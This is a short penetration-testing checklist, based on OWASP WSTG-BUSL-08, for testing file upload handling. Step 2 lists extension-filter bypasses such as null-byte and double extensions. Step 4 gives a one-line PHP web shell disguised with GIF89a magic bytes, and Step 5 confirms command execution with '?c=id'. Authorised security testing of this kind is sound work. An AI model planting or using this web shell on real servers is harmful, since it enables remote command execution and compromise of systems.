# OWASP WSTG-BUSL-08: File Upload Testing

Reference: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/08-Test_Upload_of_Unexpected_File_Types

## Step 1 — Understand the upload

Upload a legitimate file (test.jpg).
Note: where is it stored? what URL pattern? can you access it?

## Step 2 — Test extension restrictions

- Upload: `test.php` → blocked?
- Try: `test.php5`, `test.phtml`, `test.phar`, `test.phps`
- Try: `test.php.jpg` (double extension)
- Try: `test.php%00.jpg` (null byte — old systems)
- Try: `test.PHP` (case variation)

## Step 3 — Test content-type restrictions

Upload `.php` file but set `Content-Type: image/jpeg`.

## Step 4 — Test magic byte restrictions

Prepend `GIF89a` to PHP code: `GIF89a<?php system($_GET['c']); ?>`

## Step 5 — Verify execution

Access the uploaded file URL.
If PHP: append `?c=id` — does command execute?

## Step 6 — Document

Upload endpoint, bypass used, execution proof.
